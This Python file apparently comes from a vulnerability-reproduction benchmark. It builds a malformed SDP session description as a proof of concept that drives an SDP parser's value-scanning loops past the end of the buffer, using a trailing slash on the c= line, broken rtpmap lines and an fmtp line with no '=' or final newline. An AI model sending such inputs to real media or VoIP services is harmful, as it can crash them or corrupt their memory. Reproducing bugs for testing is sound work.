import os
import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # PoC targets SDP parsing; provide a standalone SDP body crafted
        # with malformed attribute values to trigger out-of-bounds scanning.
        #
        # Intentionally:
        # - c= line ends with a slash without following digits
        # - rtpmap lines missing expected delimiters
        # - final fmtp line omits '=', placed at the end without a newline
        #
        # These patterns are designed to exercise value scanning loops that
        # failed to ensure pointer remains within the end of the value.
        body_lines = [
            "v=0",
            "o=- 0 0 IN IP4 127.0.0.1",
            "s=-",
            "t=0 0",
            "c=IN IP4 1.2.3.4/",
            "m=audio 9 RTP/AVP 111 96 97 98",
            "a=rtpmap:111 opus/48000",
            "a=rtpmap:96 PCMU",
            "a=rtpmap:97 PCMA/8000",
            "a=ice-ufrag:abcd1234 efgh",   # space-delimited tokens to exercise scans
            "a=ice-pwd:ijklmnopqrstuvwx yz",  # malformed with unexpected space
            "a=fingerprint:sha-256 01:23:45:67:89:AB:CD:EF",  # space in value
            "a=setup:actpass",
            "a=rtcp:9 IN IP4 0.0.0.0/",
            "a=fmtp:111 useinbandfec1"  # No '=' and no trailing newline to force end-of-value boundary
        ]
        # Join with CRLF except the last line (no trailing newline) to amplify end-of-buffer edge
        sdp = "\r\n".join(body_lines[:-1]) + "\r\n" + body_lines[-1]
        return sdp.encode("ascii", errors="ignore")